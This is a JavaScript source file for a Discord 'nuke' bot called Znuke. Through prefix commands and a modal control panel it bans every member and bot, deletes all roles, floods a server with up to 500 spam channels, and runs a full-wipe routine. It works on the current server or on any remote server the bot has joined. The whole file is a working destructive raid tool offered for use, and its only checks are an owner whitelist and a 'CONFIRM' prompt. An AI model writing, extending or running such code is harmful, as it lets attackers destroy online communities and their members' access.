// src/index.js — Bot entry point
//
// Usage:
//   znuke                 → full nuke current server (ban all + bots)
//   znuke <server_id>     → full nuke remote server
//   znuke manager         → open Znuke Manager (single modal, all options)

import 'dotenv/config';
import {
  Client,
  GatewayIntentBits,
  Events,
  Partials,
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle,
} from 'discord.js';
import { nukeServer } from './commands/nuke.js';

// ─── Owner whitelist ───────────────────────────────────────────────────────────
const ALLOWED_IDS = new Set(
  (process.env.OWNER_IDS ?? '')
    .split(',')
    .map((id) => id.trim())
    .filter(Boolean),
);

const PREFIX = 'znuke';

// ─── Deduplication guard ───────────────────────────────────────────────────────
const handledMessages = new Set();

// ─── Client ───────────────────────────────────────────────────────────────────
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages,
  ],
  partials: [Partials.Channel],
});

// ─── Global error guard ────────────────────────────────────────────────────────
client.on('error', (err) => console.error('[client error]', err.message));
process.on('unhandledRejection', (err) => console.error('[unhandledRejection]', err?.message ?? err));

// ─── Helper: send safely (channel may be deleted after nuke) ──────────────────
async function safeSend(channel, user, payload) {
  try {
    await channel.send(payload);
  } catch {
    try {
      const dm = await user.createDM();
      await dm.send(payload);
    } catch (dmErr) {
      console.warn('[safeSend] Could not DM user either:', dmErr.message);
    }
  }
}

// ─── Helper: open the Znuke Manager single-button embed ───────────────────────
async function sendManagerEmbed(channel) {
  const embed = new EmbedBuilder()
    .setColor(0xff3c3c)
    .setTitle('🗡️ Znuke Manager')
    .setDescription(
      [
        '> Advanced nuke control panel.',
        '',
        '**Modes:**',
        '`1` — **Chan & Role** — Create spam channels + delete all roles',
        '`2` — **Ban All** — Ban every member & bot in the server',
        '`3` — **Wipe All** — Delete everything + ban all + create spam channels',
        '',
        '> Click **Launch Manager** to open the control panel.',
      ].join('\n'),
    )
    .setFooter({ text: 'Only authorised users can interact with this panel.' })
    .setTimestamp();

  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder()
      .setCustomId('manager_open')
      .setLabel('⚙️ Launch Manager')
      .setStyle(ButtonStyle.Danger),
  );

  await channel.send({ embeds: [embed], components: [row] });
}

// ─── Ready ────────────────────────────────────────────────────────────────────
client.once(Events.ClientReady, (c) => {
  console.log(`\n✅  Logged in as ${c.user.tag}`);
  console.log(`📡  Watching ${c.guilds.cache.size} guild(s)`);
  console.log(`☢️   znuke command is active`);
  console.log(`👑  Authorised users: ${[...ALLOWED_IDS].join(', ') || 'NONE SET'}\n`);
});

// ─── Message handler ──────────────────────────────────────────────────────────
client.on(Events.MessageCreate, async (message) => {
  // Ignore bots
  if (message.author.bot) return;

  const content = message.content.trim();

  // Must start with "znuke" (case-insensitive)
  if (!content.toLowerCase().startsWith(PREFIX)) return;

  // ── Deduplication ─────────────────────────────────────────────────────────
  if (handledMessages.has(message.id)) return;
  handledMessages.add(message.id);
  setTimeout(() => handledMessages.delete(message.id), 60_000);

  // ── Authorisation check ───────────────────────────────────────────────────
  if (!ALLOWED_IDS.has(message.author.id)) {
    return message.reply({
      embeds: [
        new EmbedBuilder()
          .setColor(0xff3c3c)
          .setTitle('🚫 Access Denied')
          .setDescription('You are **not authorised** to use this command.')
          .setTimestamp(),
      ],
    }).catch(() => {});
  }

  // ── Parse arguments ───────────────────────────────────────────────────────
  const args      = content.slice(PREFIX.length).trim().split(/\s+/).filter(Boolean);
  const isManager = args[0]?.toLowerCase() === 'manager';

  // ── znuke manager — show the embed with one button ────────────────────────
  if (isManager) {
    return sendManagerEmbed(message.channel).catch(() => {});
  }

  // ── znuke / znuke <server_id> — direct full nuke ──────────────────────────
  const serverIdArg = args[0];
  const targetId    = serverIdArg ?? message.guild?.id;

  if (!targetId) {
    return message.reply(
      '❌ Provide a server ID when using this in DMs.\n`znuke <server_id>`',
    ).catch(() => {});
  }

  let targetGuild;
  try {
    targetGuild = await client.guilds.fetch(targetId);
  } catch {
    return message.reply(
      `❌ Cannot reach server \`${targetId}\`.\nThe bot must be a member of that server.`,
    ).catch(() => {});
  }

  const isRemote      = targetId !== message.guild?.id;
  const reportChannel = message.channel;
  const invoker       = message.author;

  // Confirmation prompt
  await message.reply({
    embeds: [
      new EmbedBuilder()
        .setColor(0xff3c3c)
        .setTitle('⚠️ Confirm Nuke')
        .setDescription(
          [
            `**Target:** ${targetGuild.name} (\`${targetGuild.id}\`)`,
            `**Action:** 🔨 Ban All (members + bots)`,
            isRemote ? '> 🌐 **Remote nuke**' : '> 🏠 **Local nuke**',
            '',
            'Type **`confirm`** within 30 seconds to proceed.',
          ].join('\n'),
        )
        .setTimestamp(),
    ],
  }).catch(() => {});

  const filter = (m) =>
    m.author.id === invoker.id && m.content.toLowerCase() === 'confirm';

  try {
    await message.channel.awaitMessages({ filter, max: 1, time: 30_000, errors: ['time'] });
  } catch {
    return message.channel.send('✅ Nuke cancelled — timed out. No action taken.').catch(() => {});
  }

  await safeSend(reportChannel, invoker, {
    embeds: [
      new EmbedBuilder()
        .setColor(0xff3c3c)
        .setTitle('☢️ Nuke In Progress…')
        .setDescription(`🔴 Wiping **${targetGuild.name}**…`)
        .setTimestamp(),
    ],
  });

  try {
    const log = await nukeServer(targetGuild, client.user.id);
    await safeSend(reportChannel, invoker, {
      embeds: [
        new EmbedBuilder()
          .setColor(0x2b2d31)
          .setTitle('💀 Nuke Complete')
          .setDescription(log.join('\n'))
          .setFooter({ text: `${targetGuild.name} (${targetGuild.id})` })
          .setTimestamp(),
      ],
    });
  } catch (err) {
    console.error('[znuke] Unexpected error:', err.message);
    await safeSend(reportChannel, invoker, `❌ Nuke error: \`${err.message}\``);
  }
});

// ─── Interaction handler (button + modal) ─────────────────────────────────────
client.on(Events.InteractionCreate, async (interaction) => {

  // ── Auth check ────────────────────────────────────────────────────────────
  if (!ALLOWED_IDS.has(interaction.user.id)) {
    return interaction.reply({
      embeds: [
        new EmbedBuilder()
          .setColor(0xff3c3c)
          .setTitle('🚫 Access Denied')
          .setDescription('You are **not authorised** to use this.'),
      ],
      ephemeral: true,
    }).catch(() => {});
  }

  const guild = interaction.guild;
  if (!guild) {
    return interaction.reply({
      content: '❌ Must be used inside a server.',
      ephemeral: true,
    }).catch(() => {});
  }

  // ─────────────────────────────────────────────────────────────────────────
  // BUTTON: Launch Manager → open the single unified modal
  // ─────────────────────────────────────────────────────────────────────────
  if (interaction.isButton() && interaction.customId === 'manager_open') {
    const modal = new ModalBuilder()
      .setCustomId('modal_manager')
      .setTitle('Znuke Manager');

    modal.addComponents(
      // Field 1: Server ID (optional — blank = current server)
      new ActionRowBuilder().addComponents(
        new TextInputBuilder()
          .setCustomId('server_id')
          .setLabel('Server ID (blank = current server)')
          .setStyle(TextInputStyle.Short)
          .setRequired(false),
      ),
      // Field 2: Mode
      new ActionRowBuilder().addComponents(
        new TextInputBuilder()
          .setCustomId('mode')
          .setLabel('Mode (1=Chan&Role, 2=BanAll, 3=WipeAll)')
          .setStyle(TextInputStyle.Short)
          .setRequired(true),
      ),
      // Field 3: Channels to Create
      new ActionRowBuilder().addComponents(
        new TextInputBuilder()
          .setCustomId('channels_count')
          .setLabel('Channels to Create (0-500)')
          .setStyle(TextInputStyle.Short)
          .setRequired(true),
      ),
      // Field 4: Channel Name
      new ActionRowBuilder().addComponents(
        new TextInputBuilder()
          .setCustomId('channel_name')
          .setLabel('Channel Name')
          .setStyle(TextInputStyle.Short)
          .setRequired(true),
      ),
      // Field 5: CONFIRM — only field with a placeholder
      new ActionRowBuilder().addComponents(
        new TextInputBuilder()
          .setCustomId('confirm')
          .setLabel('Type CONFIRM to proceed')
          .setStyle(TextInputStyle.Short)
          .setPlaceholder('CONFIRM')
          .setRequired(true),
      ),
    );

    return interaction.showModal(modal).catch(() => {});
  }

  // ─────────────────────────────────────────────────────────────────────────
  // MODAL SUBMIT: Znuke Manager — execute everything at once
  // ─────────────────────────────────────────────────────────────────────────
  if (interaction.isModalSubmit() && interaction.customId === 'modal_manager') {
    const confirmVal = interaction.fields.getTextInputValue('confirm').trim().toUpperCase();
    if (confirmVal !== 'CONFIRM') {
      return interaction.reply({
        content: '❌ Cancelled — you did not type CONFIRM.',
        ephemeral: true,
      }).catch(() => {});
    }

    const serverIdInput = interaction.fields.getTextInputValue('server_id').trim();
    const mode          = interaction.fields.getTextInputValue('mode').trim();
    const rawCount      = interaction.fields.getTextInputValue('channels_count').trim();
    const channelName   = interaction.fields.getTextInputValue('channel_name').trim() || 'nuked';
    const count         = Math.min(Math.max(parseInt(rawCount, 10) || 0, 0), 500);

    // Validate mode
    if (!['1', '2', '3'].includes(mode)) {
      return interaction.reply({
        content: '❌ Invalid mode. Enter `1`, `2`, or `3`.',
        ephemeral: true,
      }).catch(() => {});
    }

    // ── Resolve target guild (remote or current) ──────────────────────────
    let targetGuild = guild; // default: current server
    let isRemote    = false;

    if (serverIdInput && serverIdInput !== guild.id) {
      try {
        targetGuild = await client.guilds.fetch(serverIdInput);
        isRemote = true;
      } catch {
        return interaction.reply({
          content: `❌ Cannot reach server \`${serverIdInput}\`.\nThe bot must be a member of that server.`,
          ephemeral: true,
        }).catch(() => {});
      }
    }

    const modeLabel = mode === '1' ? 'Chan & Role' : mode === '2' ? 'Ban All' : 'Wipe All';

    // Acknowledge immediately
    await interaction.reply({
      embeds: [
        new EmbedBuilder()
          .setColor(0xff3c3c)
          .setTitle('☢️ Executing…')
          .setDescription(
            [
              `**Target:** ${targetGuild.name} (\`${targetGuild.id}\`)`,
              isRemote ? '> 🌐 **Remote nuke**' : '> 🏠 **Local nuke**',
              `**Mode:** \`${modeLabel}\``,
              mode !== '2' ? `**Channels:** \`${count}\` × \`${channelName}\`` : '',
              '> Running all tasks simultaneously…',
            ].filter(Boolean).join('\n'),
          )
          .setTimestamp(),
      ],
      ephemeral: true,
    }).catch(() => {});

    const log = [];

    try {
      // ── MODE 1: Chan & Role ──────────────────────────────────────────────
      if (mode === '1') {
        const [chanResult, roleResult] = await Promise.allSettled([
          (async () => {
            const tasks = Array.from({ length: count }, () =>
              targetGuild.channels.create({ name: channelName }).catch(() => {}),
            );
            const results = await Promise.allSettled(tasks);
            const ok = results.filter((r) => r.status === 'fulfilled').length;
            return `📣 **Channels Created** — \`${ok}\` created`;
          })(),
          (async () => {
            const botMember  = await targetGuild.members.fetch(client.user.id);
            const botTopRole = botMember.roles.highest.position;
            const roles      = targetGuild.roles.cache.filter(
              (r) => r.id !== targetGuild.id && r.position < botTopRole,
            );
            const tasks   = roles.map((r) => r.delete().catch(() => {}));
            const results = await Promise.allSettled(tasks);
            const ok = results.filter((r) => r.status === 'fulfilled').length;
            return `🎭 **Roles Deleted** — \`${ok}\` deleted`;
          })(),
        ]);

        if (chanResult.status === 'fulfilled') log.push(chanResult.value);
        else log.push('📣 **Channels** — failed');
        if (roleResult.status === 'fulfilled') log.push(roleResult.value);
        else log.push('🎭 **Roles** — failed');
      }

      // ── MODE 2: Ban All ──────────────────────────────────────────────────
      if (mode === '2') {
        await targetGuild.members.fetch().catch(() => {});
        const members = targetGuild.members.cache.filter((m) => m.id !== client.user.id);
        const results = await Promise.allSettled(
          members.map((m) => m.ban({ reason: 'Znuke Manager — Ban All' }).catch(() => {})),
        );
        const ok = results.filter((r) => r.status === 'fulfilled').length;
        log.push(`🔨 **Members Banned** — \`${ok}\` banned (including bots)`);
      }

      // ── MODE 3: Wipe All ─────────────────────────────────────────────────
      if (mode === '3') {
        const nukeLog = await nukeServer(targetGuild, client.user.id, count, channelName);
        log.push(...nukeLog);
      }

    } catch (err) {
      console.error('[manager modal] Error:', err.message);
      log.push(`❌ Error: \`${err.message}\``);
    }

    await interaction.followUp({
      embeds: [
        new EmbedBuilder()
          .setColor(0x2b2d31)
          .setTitle('💀 Done')
          .setDescription(log.join('\n') || 'No actions were performed.')
          .setFooter({ text: `${targetGuild.name} (${targetGuild.id}) · Mode ${mode} (${modeLabel})` })
          .setTimestamp(),
      ],
      ephemeral: true,
    }).catch(() => {});
  }
});

// ─── Login ────────────────────────────────────────────────────────────────────
client.login(process.env.BOT_TOKEN);
